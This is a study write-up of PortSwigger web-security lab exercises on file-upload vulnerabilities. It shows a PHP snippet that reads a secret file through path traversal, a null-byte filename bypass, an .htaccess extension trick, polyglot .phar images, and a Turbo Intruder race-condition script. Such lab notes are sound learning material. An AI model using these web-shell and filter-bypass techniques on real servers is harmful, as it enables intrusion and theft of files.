creds: 
	wiener:peter

# Remote code execution via web shell upload
Login using Given creds wiener:peter

using simple webshell from
[easy-simple-php-webshell.php](https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php)

![[Pasted image 20230304174619.png]]
![[Pasted image 20230304174630.png]]
![[Pasted image 20230304174711.png]]![[Pasted image 20230304174728.png]]
![[Pasted image 20230304174747.png]]
![[Pasted image 20230304174807.png]]

# Web shell upload via Content-Type restriction bypass
login 
trying to upload php shell and got this error
![[Pasted image 20230304175656.png]]
changing file type using burp 
![[Pasted image 20230304175817.png]]
![[Pasted image 20230304175833.png]]
![[Pasted image 20230304175851.png]]
![[Pasted image 20230304175903.png]]
![[Pasted image 20230304175923.png]]


# 
Login

uploaded shell to the server

![[Pasted image 20230304180113.png]]
when uploading any php file it just displays the text on website without executing
```php
<?php
echo file_get_contents("../../../../../..//home/carlos/secret");
?>
```

![[Pasted image 20230304183646.png]]
what we can do is use path traversal vulnerability in the file name to save it somewhere else where it will get executed
![[Pasted image 20230304193454.png]]
flag will be located inside 1 directory back 
![[Pasted image 20230304193605.png]]
![[Pasted image 20230304193614.png]]


# Web shell upload via extension blacklist bypass


looking at this [article](https://thibaud-robin.fr/articles/bypass-filter-upload/) we know that we can upload a .htaccess and add the extension we want to execute inside the file and we tested earlier that .php5 gets executed
and lso make content type text/plain
![[Pasted image 20230304201629.png]] 
then upload our payload
![[Pasted image 20230304201819.png]]
![[Pasted image 20230304201848.png]]


# Web shell upload via obfuscated file extension

using [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-upload)
`file.php%00.png%00.jpg` worked by using null byte bypass 
![[Pasted image 20230304203132.png]]
accessing the file 
![[Pasted image 20230304203259.png]]


# Remote code execution via polyglot web shell upload

Polyglots, in a security context, are files that are a valid form of multiple different file types. For example, a GIFAR is both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.
Polyglot files are often used to bypass protection based on file types. Many applications that allow users to upload files only allow uploads of certain types, such as JPEG, GIF, DOC, so as to prevent users from uploading potentially dangerous files like JS files, PHP files or Phar files.
This helps to upload a file that complins with the format of several different formats. It can allows you to upload a PHAR file (PHp ARchive) that also looks like a JPEG, but probably you will still needs a valid extension and if the upload function doesn't allow it this won't help you.

## Solution 

downloading a random image from google and then appending the code to it
![[Pasted image 20230304205254.png]]
and give it extension .phar which is php and rar
![[Pasted image 20230304205401.png]]
![[Pasted image 20230304205416.png]]
viewing page source and going to the end of the file

![[Pasted image 20230304205454.png]]



# Web shell upload via race condition
Because website downloads the file then does a virus check and validate the file it can be vulnerable to a race condition attack which is sending multiple requests in quick succession  which result in getting the file executed before getting deleted by the filter
## Solution 1 Intruder
Getting both Post requests and GET requests into intruder to run them bother together in succession to upload the file then retrieve it's content in same time

![[Pasted image 20230304220400.png]]

![[Pasted image 20230304220435.png]]

both payloads will be null 
![[Pasted image 20230304220455.png]]

start attack on both
![[Pasted image 20230304220540.png]]

## Solution 2 Turbo Intruder


downloading turbo intruder to burp
![[Pasted image 20230304221511.png]]
![[Pasted image 20230304221552.png]]

using the following turbo intruder script 
[turbointruder.py](https://github.com/nh4ttruong/portswigger/blob/main/file-upload-vulnerabilities/race-condition/turbo-sample.py)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```
then replacing POST and GET request 
then attack
![[Pasted image 20230304221707.png]]
![[Pasted image 20230304221739.png]]

---
Tags: #file_upload 
Resources:
[HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload)
[Vikie](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
[Th1b4ud blog](https://thibaud-robin.fr/articles/bypass-filter-upload/)
[onsecurity](https://www.onsecurity.io/blog/file-upload-checklist/#uploading-a-htaccess-file)
